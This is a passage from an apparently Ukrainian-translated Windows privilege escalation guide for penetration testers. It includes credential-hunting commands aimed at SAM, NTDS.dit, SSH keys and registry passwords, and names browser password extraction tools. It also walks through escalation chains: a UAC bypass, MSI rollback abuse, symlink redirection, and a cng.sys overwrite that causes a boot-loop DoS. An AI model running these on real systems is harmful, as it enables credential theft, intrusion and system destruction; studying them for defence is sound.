%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Бази даних Password Safe v3 зазвичай мають розширення `.psafe3`. Розглядайте файл із таким ім’ям як можливий зашифрований сейф; його наявність не означає, що ви можете прочитати його, розблокувати чи скористатися збереженими обліковими даними. Перевірте доступні профілі користувачів і налаштовані корені спільних файлових ресурсів, щоб з’ясувати, де зберігаються такі файли.

Файл KeePass `.kdbx`, який можна прочитати, так само є лише ознакою можливого зашифрованого сейфа. Щоб розблокувати його, потрібні справжній майстер-пароль і будь-який налаштований файл ключа чи чинники облікового запису. Якщо під час авторизованої перевірки в записі знайдено пару хешів LM:NT, перевірте вказаний обліковий запис і з’ясуйте, чи є хеш NT актуальним і чи приймає його служба NTLM на цільовій системі, перш ніж розглядати [pass-the-hash](../ntlm/README.md#pass-the-hash). Запис у сейфі сам по собі не надає прав Administrator або SYSTEM; також мають бути наявні віддалений доступ до служби, права облікового запису та окремий крок виконання через службу, якщо він потрібен. В інвентаризації слід указувати шлях до сейфа та можливість його прочитати, а не виводити базу даних або збережені облікові дані.

Знайдіть усі запропоновані файли:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Облікові дані в Кошику

Перевірте доступні записи Кошика на наявність видалених резервних копій і архівів конфігурацій, а також файлів, у назвах яких прямо згадуються облікові дані. Корисна резервна копія `.7z`, `.zip` або `.rar` може бути кількамісячної давності й мати звичайну назву. Windows зберігає початковий шлях і час видалення в записі `$I`, а видалений файл — у відповідному записі `$R`; перш ніж відкривати архів, перевірте метадані та наявність прав на читання для поточного облікового запису. Видимість залежить від тому, SID користувача та дозволів на файли, тому порожній список не доводить, що відновлюваних резервних копій немає. Розглядайте назву архіву як підставу для перевірки, а не як доказ наявності дійсного секрету.

Доступний видалений файл `.pfx` також може бути зачіпкою для **підписування коду**. Якщо він містить доступний приватний ключ, цим ключем можна підписати змінений сценарій PowerShell; [PowerShell вимагає сертифікат для підписування коду з приватним ключем](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), а [правила видавця AppLocker перевіряють особу підписувача та область дії правила](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Для виконання під обліковим записом іншого користувача поточний обліковий запис має мати змогу змінити конкретний сценарій, чинне правило має приймати отриманий підпис для цього сценарію та цільового облікового запису, а заплановане завдання чи інший процес із вищими привілеями має фактично запускати його. Сама назва файлу `.pfx`, тема сертифіката або можливість запису до сценарію не підтверджують наявність такого ланцюжка. Перш ніж відкривати матеріали приватного ключа або запускати завдання, перевірте метадані, ACL, політику та команду запланованого завдання.

Також перевірте доступні бази даних профілів клієнтів обміну повідомленнями, нотатки й отримані файли на наявність зачіпок щодо облікових даних. Експорт ключа відновлення BitLocker може зберігатися у форматі HTML або TXT, іноді всередині архіву резервної копії з відповідною назвою. Такі матеріали можуть надати доступ до окремого зашифрованого тому з давнішими резервними копіями; перевіряйте том і архів лише за наявності дозволу. Якщо резервна копія містить `NTDS.dit`, для відновлення доменних облікових даних офлайн також потрібен відповідний розділ реєстру `SYSTEM`, як описано в [процесі роботи з резервними копіями та привілейованими групами](../active-directory-methodology/privileged-groups-and-token-privileges.md). Самі лише назви файлів і заблокований том не доводять наявності придатного ключа відновлення чи резервної копії домену.

Для **відновлення паролів**, збережених у кількох програмах, можна скористатися: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Усередині реєстру

**Інші можливі розділи реєстру з обліковими даними**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Витягування ключів openssh із реєстру.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Перевірте бази даних, у яких зберігаються паролі з **Chrome, Edge або Firefox**.\
Також перевірте історію, закладки та обране браузерів — можливо, там зберігаються **паролі**.

У стандартному профілі Edge **Default** поточного користувача файл `Login Data` розташований у `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, а `Local State` — у батьківському каталозі `User Data`. [Microsoft документує стандартне розташування профілю](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); інший профіль або політика `UserDataDir` можуть змінити цей шлях. Наявність файлів лише вказує на можливе сховище облікових даних: перевірте, чи доступні файли для читання, чи є контекст DPAPI відповідного користувача або інший дозволений ключовий матеріал, а також чи належить збережений логін обліковому запису з вищими привілеями. Перелік лише шляхів не вимагає відкривати базу даних або виводити розшифровані паролі.

Для Firefox [Mozilla документує](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), що `key4.db` і `logins.json` у профілі — це парні файли ключів і зашифрованих логінів. Їхня наявність лише вказує на можливу знахідку: перевірте, чи доступні обидва файли для читання, чи є збережені записи та чи захищений ключ Primary Password, перш ніж робити висновок, що облікові дані можна використати. Якщо відновлені облікові дані належать доменному обліковому запису, окремо перевірте ефективні права цього облікового запису на керування групами та права групи на [читання або розшифрування пароля LAPS](../active-directory-methodology/laps.md); самі артефакти браузера не підтверджують наявність шляху до прав адміністратора.

Інструменти для витягування паролів із браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка забезпечує **взаємодію** між програмними компонентами, написаними різними мовами. Кожен компонент COM **ідентифікується за допомогою ідентифікатора класу (CLSID)**, а функціональність кожного компонента надається через один або кілька інтерфейсів, ідентифікованих за допомогою ідентифікаторів інтерфейсу (IID).

Класи та інтерфейси COM визначаються в реєстрі у відповідних розділах **HKEY\CLASSES\ROOT\CLSID** та **HKEY\CLASSES\ROOT\Interface**. Цей розділ реєстру створюється шляхом об'єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

У CLSID цього розділу реєстру можна знайти дочірній розділ **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, і значення **ThreadingModel**, яке може мати значення **Apartment** (однопотокова модель), **Free** (багатопотокова модель), **Both** (однопотокова або багатопотокова) або **Neutral** (модель без прив'язки до потоку).

![Історія браузерів — перезапис COM DLL: у CLSID цього розділу реєстру можна знайти дочірній розділ InProcServer32, який містить значення за замовчуванням, що вказує на DLL, і значення...](<../../images/image (729).png>)

Отже, якщо ви можете **перезаписати будь-яку DLL**, яка буде запущена, ви можете **підвищити привілеї**, якщо цю DLL запустить інший користувач.

Щоб дізнатися, як зловмисники використовують COM Hijacking як механізм закріплення, дивіться:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Пошук паролів у файлах і реєстрі**

**Пошук вмісту файлів**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Пошук файлу за певною назвою**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Шукайте в реєстрі назви ключів і паролі**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Інструменти для пошуку паролів

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **— це плагін msf**. Я створив цей плагін, щоб **автоматично запускати кожен POST-модуль Metasploit, який шукає облікові дані** на комп’ютері жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли з паролями, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для отримання паролів із системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сесії**, **імена користувачів** і **паролі** кількох інструментів, які зберігають ці дані у відкритому тексті (PuTTY, WinSCP, FileZilla, SuperPuTTY і RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Уявіть, що **процес, запущений від імені SYSTEM, відкриває новий процес** (`OpenProcess()`) з **повним доступом**. Цей самий процес **також створює новий процес** (`CreateProcess()`) **з низькими привілеями, але той успадковує всі відкриті дескриптори головного процесу**.\
Тоді, якщо ви маєте **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий дескриптор привілейованого процесу**, створений за допомогою `OpenProcess()`, і **ін’єктувати shellcode**.\
[Прочитайте цей приклад, щоб дізнатися більше про те, **як виявити й експлуатувати цю вразливість**.](leaked-handle-exploitation.md)\
[Прочитайте [**цю іншу публікацію**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/), щоб отримати докладніше пояснення про тестування та зловживання відкритими дескрипторами процесів і потоків, успадкованими з різними рівнями дозволів (не лише з повним доступом).](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Сегменти спільної пам’яті, які називають **каналами (pipes)**, забезпечують обмін даними та взаємодію між процесами.

Windows має функцію під назвою **Named Pipes**, яка дає змогу не пов’язаним між собою процесам обмінюватися даними, зокрема через різні мережі. Це схоже на архітектуру клієнт/сервер із ролями **сервера іменованого каналу** та **клієнта іменованого каналу**.

Коли **клієнт** надсилає дані через канал, **сервер**, який створив цей канал, може **перейняти ідентичність** **клієнта**, якщо має необхідні права **SeImpersonate**. Якщо виявити **привілейований процес**, який взаємодіє через канал, що його можна імітувати, з’явиться можливість **підвищити привілеї**, перейнявши ідентичність цього процесу після його взаємодії зі створеним вами каналом. Інструкції з виконання такої атаки наведено [**тут**](named-pipe-client-impersonation.md) і [**тут**](#from-high-integrity-to-system).

Також цей інструмент дає змогу **перехоплювати обмін даними через іменований канал за допомогою такого інструмента, як Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept), **а цей інструмент дає змогу переглядати всі канали, щоб знаходити privescs:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Служба Telephony (TapiSrv) у режимі сервера відкриває `\\pipe\\tapsrv` (MS-TRP). Віддалений автентифікований клієнт може зловживати асинхронним шляхом подій на основі mailslot, щоб перетворити `ClientAttach` на довільний **запис 4 байтів** у будь-який наявний файл, доступний для запису користувачу `NETWORK SERVICE`, а потім отримати права адміністратора Telephony і завантажити довільну DLL як служба. Повний ланцюжок атаки:

- Викликати `ClientAttach`, задавши для `pszDomainUser` шлях до наявного файлу, доступного для запису → служба відкриє його через `CreateFileW(..., OPEN_EXISTING)` і використовуватиме для асинхронного запису подій.
- Кожна подія записує в цей дескриптор контрольоване зловмисником значення `InitContext` із `Initialize`. Зареєструйте line app за допомогою `LRegisterRequestRecipient` (`Req_Func 61`), викличте `TRequestMakeCall` (`Req_Func 121`), отримайте дані через `GetAsyncEvents` (`Req_Func 0`), а потім скасуйте реєстрацію/завершіть роботу, щоб повторити детерміновані записи.
- Додайте себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, перепідключіться, а потім викличте `GetUIDllName` із довільним шляхом до DLL, щоб виконати `TSPI_providerUIIdentify` від імені `NETWORK SERVICE`.

Докладніше:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Різне

### Розширення файлів, які можуть виконувати команди у Windows

Відвідайте сторінку **[https://filesec.io/](https://filesec.io/)**

### Зловживання обробником протоколу / ShellExecute через засоби відображення Markdown

Клікабельні посилання Markdown, передані до `ShellExecuteExW`, можуть запускати небезпечні URI-обробники (`file:`, `ms-appinstaller:` або будь-яку зареєстровану схему) й виконувати контрольовані зловмисником файли від імені поточного користувача. Дивіться:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Моніторинг командних рядків на наявність паролів**

Коли ви отримуєте shell від імені користувача, можуть виконуватися заплановані завдання чи інші процеси, які **передають облікові дані в командному рядку**. Наведений нижче скрипт кожні дві секунди збирає командні рядки процесів і порівнює поточний стан із попереднім, виводячи всі відмінності.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Викрадення паролів із процесів

## Від користувача з низькими привілеями до NT\AUTHORITY SYSTEM (CVE-2019-1388) / обхід UAC

Якщо у вас є доступ до графічного інтерфейсу (через консоль або RDP) і UAC увімкнено, у деяких версіях Microsoft Windows можна запустити термінал або будь-який інший процес від імені "NT\AUTHORITY SYSTEM", перебуваючи в системі як непривілейований користувач.

Це дає змогу одночасно підвищити привілеї та обійти UAC за допомогою тієї самої вразливості. Крім того, нічого не потрібно встановлювати, а бінарний файл, який використовується під час цього процесу, підписаний і виданий Microsoft.

До уражених систем належать, зокрема, такі:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Щоб експлуатувати цю вразливість, необхідно виконати такі кроки:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

У вас є всі необхідні файли та інформація в цьому репозиторії GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Від Administrator Medium до High Integrity Level / обхід UAC

Прочитайте це, щоб **дізнатися про Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Потім **прочитайте це, щоб дізнатися про UAC та обходи UAC:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions у каталозі завантажень, що ведуть до кореневого каталогу вебсервера

Програма може створити каталог для завантажень із передбачуваною назвою, записати в нього файл із назвою, заданою користувачем, а потім обробити цей файл. Якщо користувач із низькими привілеями може видалити цей каталог і замінити його на NTFS junction до запису з боку сервера, запис може перейти через junction до каталогу, який обслуговує вебсервер. Розміщений там скрипт може виконуватися від імені облікового запису вебслужби, якщо сервер запускає файли такого типу. Це специфічна для програми межа довільного запису; сам факт, що каталог для завантажень доступний для запису або що в ньому вже є junction, нічого не доводить.

Перевірте точну побудову шляху й послідовність дій в обробнику завантажень, фактичні права користувача на видалення та створення каталогу, ефективні ACL цільового каталогу, чи переходить процес запису за reparse points, а також чи виконує вебсервер файли в цьому каталозі. Окремо підтвердьте ідентичності процесу запису та вебсервера. Пасивна інвентаризація може показати ACL каталогів і метадані reparse points, але не дасть змоги визначити поведінку обробника чи майбутню підміну junction. Якщо виконання відбувається від імені облікового запису служби, перш ніж розглядати окремий шлях через привілеї токена, перевірте **фактичний токен процесу**.

## Від довільного видалення/переміщення/перейменування папок до SYSTEM EoP

Техніка описана [**в цій статті блогу**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), а код експлойта [**доступний тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Суть атаки полягає у зловживанні функцією rollback Windows Installer, щоб замінити легітимні файли шкідливими під час видалення. Для цього зловмисник має створити **шкідливий MSI installer**, який використовуватиметься для перехоплення папки `C:\Config.Msi`. Пізніше Windows Installer використовуватиме її для зберігання rollback-файлів під час видалення інших MSI-пакетів; ці файли буде змінено так, щоб вони містили шкідливе навантаження.

Короткий опис техніки:

1. **Етап 1 — підготовка до перехоплення (залишити `C:\Config.Msi` порожньою)**

- Крок 1: встановлення MSI
    - Створіть `.msi`, який встановлює нешкідливий файл (наприклад, `dummy.txt`) у доступну для запису папку (`TARGETDIR`).
    - Позначте installer як **"UAC Compliant"**, щоб його міг запускати **користувач без прав адміністратора**.
    - Після встановлення залиште **відкритим handle** до файлу.

- Крок 2: початок видалення
    - Видаліть той самий `.msi`.
    - Під час видалення файли починають переміщуватися до `C:\Config.Msi` і перейменовуватися на файли `.rbf` (резервні копії для rollback).
    - **Опитуйте відкритий handle** за допомогою `GetFinalPathNameByHandle`, щоб виявити момент, коли файл стане `C:\Config.Msi\<random>.rbf`.

- Крок 3: власна синхронізація
    - `.msi` містить **власну дію під час видалення (`SyncOnRbfWritten`)**, яка:
        - Сигналізує про запис `.rbf`.
        - Потім **чекає** на іншу подію, перш ніж продовжити видалення.

- Крок 4: блокування видалення `.rbf`
    - Після сигналу **відкрийте файл `.rbf`** без `FILE_SHARE_DELETE` — це **не дасть його видалити**.
    - Потім **надішліть сигнал у відповідь**, щоб видалення могло завершитися.
    - Windows Installer не зможе видалити `.rbf`, а через те, що він не може видалити весь вміст, **`C:\Config.Msi` не видаляється**.

- Крок 5: ручне видалення `.rbf`
    - Видаліть файл `.rbf` вручну.
    - Тепер **`C:\Config.Msi` порожня** і готова до перехоплення.

> На цьому етапі **запустіть уразливість довільного видалення папки з рівнем SYSTEM**, щоб видалити `C:\Config.Msi`.

2. **Етап 2 — заміна rollback-скриптів шкідливими**

- Крок 6: повторне створення `C:\Config.Msi` зі слабкими ACL
    - Створіть папку `C:\Config.Msi` знову.
    - Задайте **слабкі DACL** (наприклад, Everyone:F) і **залиште відкритим handle** із правом `WRITE_DAC`.

- Крок 7: запуск іншого installer
    - Знову встановіть `.msi`, задавши:
        - `TARGETDIR`: доступне для запису місце.
        - `ERROROUT`: змінну, яка спричинить примусову помилку.
    - Це встановлення використовуватиметься для повторного запуску **rollback**, який читає `.rbs` і `.rbf`.

- Крок 8: стеження за `.rbs`
    - Використовуйте `ReadDirectoryChangesW`, щоб стежити за `C:\Config.Msi` і виявити появу нового `.rbs`.
    - Збережіть його ім’я.

- Крок 9: синхронізація перед rollback
    - `.msi` містить **власну дію під час встановлення (`SyncBeforeRollback`)**, яка:
        - Сигналізує про створення `.rbs`.
        - Потім **чекає**, перш ніж продовжити.

- Крок 10: повторне застосування слабких ACL
    - Після отримання події `".rbs created"`:
        - Windows Installer **повторно застосує суворі ACL** до `C:\Config.Msi`.
        - Але оскільки у вас усе ще відкритий handle із правом `WRITE_DAC`, ви можете **знову застосувати слабкі ACL**.

> ACL **перевіряються лише під час відкриття handle**, тож ви все ще можете записувати в папку.

- Крок 11: розміщення підроблених `.rbs` і `.rbf`
    - Перезапишіть файл `.rbs` **підробленим rollback-скриптом**, який наказує Windows:
        - Відновити ваш файл `.rbf` (шкідливу DLL) у **привілейоване місце** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Розмістіть підроблений `.rbf` зі **шкідливою DLL-навантаженням рівня SYSTEM**.

- Крок 12: запуск rollback
    - Надішліть сигнал події синхронізації, щоб installer продовжив роботу.
    - Налаштовано **власну дію типу 19 (`ErrorOut`)**, яка **навмисно завершує встановлення помилкою** у відомий момент.
    - Це запускає **rollback**.

- Крок 13: SYSTEM встановлює вашу DLL
    - Windows Installer:
        - Читає ваш шкідливий `.rbs`.
        - Копіює вашу DLL із `.rbf` до цільового місця.
    - Тепер у вас є **шкідлива DLL у шляху, звідки її завантажує SYSTEM**.

- Фінальний крок: виконання коду від імені SYSTEM
    - Запустіть довірений **автоматично підвищений бінарний файл** (наприклад, `osk.exe`), який завантажить перехоплену DLL.
    - **Готово**: ваш код виконується **від імені SYSTEM**.


### Від довільного видалення/переміщення/перейменування файлів до SYSTEM EoP

Основна техніка з MSI rollback (описана вище) передбачає, що ви можете видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що, якщо ваша вразливість дає змогу лише **довільно видаляти файли**?

Можна скористатися **внутрішніми механізмами NTFS**: кожна папка має прихований alternate data stream під назвою:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Цей потік зберігає **метадані індексу** папки.

Отже, якщо **видалити потік `::$INDEX_ALLOCATION`** папки, NTFS **видалить папку цілком** із файлової системи.

Це можна зробити за допомогою стандартних API для видалення файлів, наприклад:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Навіть якщо ви викликаєте API для видалення *файлу*, воно **видаляє саму папку**.

### Від видалення вмісту папки до підвищення привілеїв до SYSTEM
Що, якщо ваша примітива не дозволяє видаляти довільні файли/папки, але **дозволяє видаляти *вміст* папки, контрольованої атакувальником**?

1. Крок 1: Створіть папку-приманку та файл
- Створіть: `C:\temp\folder1`
- Усередині неї: `C:\temp\folder1\file1.txt`

2. Крок 2: Встановіть **oplock** на `file1.txt`
- **Oplock** призупиняє виконання, коли привілейований процес намагається видалити `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Крок 3: Запустити процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він доходить до `file1.txt`, **oplock спрацьовує** і передає керування вашому callback.

4. Крок 4: Усередині callback oplock — перенаправити видалення

- Варіант A: Перемістити `file1.txt` в інше місце
    - Це спорожнить `folder1`, не порушуючи oplock.
    - Не видаляйте `file1.txt` безпосередньо — це передчасно звільнить oplock.

- Варіант B: Перетворити `folder1` на **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Варіант C: Створіть **symlink** у `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Це націлено на внутрішній потік NTFS, у якому зберігаються метадані папки: його видалення видаляє папку.

5. Крок 5: Звільнення oplock
- Процес SYSTEM продовжує роботу й намагається видалити `file1.txt`.
- Але тепер через junction + symlink він насправді видаляє:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Результат**: `C:\Config.Msi` видалено користувачем SYSTEM.

### Від створення довільної папки до постійного DoS

Скористайтеся примітивом, який дає змогу **створити довільну папку від імені SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі дозволи**.

Створіть **папку** (не файл) з назвою **критично важливого драйвера Windows**, наприклад:
```
C:\Windows\System32\cng.sys
```

- Цей шлях зазвичай відповідає драйверу режиму ядра `cng.sys`.
- Якщо **заздалегідь створити його як папку**, Windows не зможе завантажити фактичний драйвер під час запуску.
- Після цього Windows спробує завантажити `cng.sys` під час запуску.
- Вона виявить папку, **не зможе знайти фактичний драйвер** і **аварійно завершить роботу або зупинить завантаження**.
- **Резервного варіанта немає**, а **відновлення неможливе** без зовнішнього втручання (наприклад, відновлення завантаження або доступу до диска).

### Від привілейованих шляхів для журналів/резервних копій і OM symlinks до довільного перезапису файлів / DoS завантаження

Коли **привілейована служба** записує журнали/експорти за шляхом, прочитаним із **конфігурації, доступної для запису**, перенаправте цей шлях за допомогою **Object Manager symlinks + NTFS mount points**, щоб перетворити привілейований запис на довільний перезапис файлів (навіть **без** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Вимоги**
- Конфігурація, у якій зберігається цільовий шлях, доступна зловмиснику для запису (наприклад, `%ProgramData%\...\.ini`).
- Можливість створити mount point до `\RPC Control` і OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Привілейована операція, яка записує дані за цим шляхом (журнал, експорт, звіт).

**Приклад ланцюжка**
1. Прочитайте конфігурацію, щоб визначити місце призначення привілейованого журналу, наприклад `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` у `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Перенаправте шлях без прав адміністратора:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Дочекайтеся, поки привілейований компонент запише журнал (наприклад, адміністратор запустить «надіслати тестове SMS»). Тепер запис потрапить у `C:\Windows\System32\cng.sys`.
4. Перевірте перезаписану ціль (за допомогою hex/PE-парсера), щоб підтвердити пошкодження; перезавантаження змусить Windows завантажити пошкоджений драйвер → **DoS через цикл перезавантаження**. Цей спосіб також підходить для будь-якого захищеного файла, який привілейована служба відкриє для запису.

> `cng.sys` зазвичай завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо копія є в `C:\Windows\System32\cng.sys`, Windows може спробувати завантажити її першою, що робить цей шлях надійною ціллю для DoS із пошкодженими даними.



## **Від High Integrity до System**

### **Нова служба**

Якщо ви вже працюєте в процесі з High Integrity, **шлях до SYSTEM** може бути простим: достатньо **створити й запустити нову службу**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Створюючи бінарний файл служби, переконайтеся, що це коректна служба або що бінарний файл швидко виконує необхідні дії, оскільки його буде завершено через 20 секунд, якщо він не є коректною службою.

### AlwaysInstallElevated

З процесу з високим рівнем цілісності можна спробувати **увімкнути записи реєстру AlwaysInstallElevated** і **встановити** reverse shell за допомогою обгортки _**.msi**_.\
[Детальніше про відповідні ключі реєстру та встановлення пакета _.msi_ — тут.](#alwaysinstallelevated)

### Від високого рівня цілісності + привілею SeImpersonate до System

**Ви можете** [**знайти код тут**](seimpersonate-from-high-to-system.md)**.**

### Від SeDebug + SeImpersonate до привілеїв повного токена

Якщо у вас є ці привілеї токена (імовірно, ви знайдете їх у процесі з високим рівнем цілісності), ви зможете **відкрити майже будь-який процес** (окрім захищених процесів) із привілеєм SeDebug, **скопіювати токен** процесу й створити **довільний процес із цим токеном**.\
Для цієї техніки зазвичай **вибирають будь-який процес, що працює від імені SYSTEM і має всі привілеї токена** (_так, можна знайти процеси SYSTEM без усіх привілеїв токена_).\
**Приклад коду, що виконує запропоновану техніку, можна знайти** [**тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Цю техніку використовує meterpreter для підвищення привілеїв у `getsystem`. Вона полягає у **створенні pipe, а потім створенні служби або зловживанні нею, щоб записати дані в цей pipe**. Тоді **сервер**, який створив pipe, використовуючи привілей **`SeImpersonate`**, зможе **імперсонувати токен** клієнта pipe (служби) й отримати привілеї SYSTEM.\
Якщо хочете [**дізнатися більше про name pipes, прочитайте це**](#named-pipe-client-impersonation).\
Приклад [**переходу від високого рівня цілісності до System за допомогою name pipes наведено тут**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **перехопити dll**, яку **завантажує** **процес**, що працює від імені **SYSTEM**, ви зможете виконувати довільний код із відповідними дозволами. Отже, Dll Hijacking також корисний для такого типу підвищення привілеїв, і, крім того, його **значно легше виконати з процесу з високим рівнем цілісності**, оскільки він матиме **дозволи на запис** у папки, звідки завантажуються dll.\
**Ви можете** [**дізнатися більше про Dll hijacking тут**](dll-hijacking/index.html)**.**

### **Від Administrator або Network Service до System**

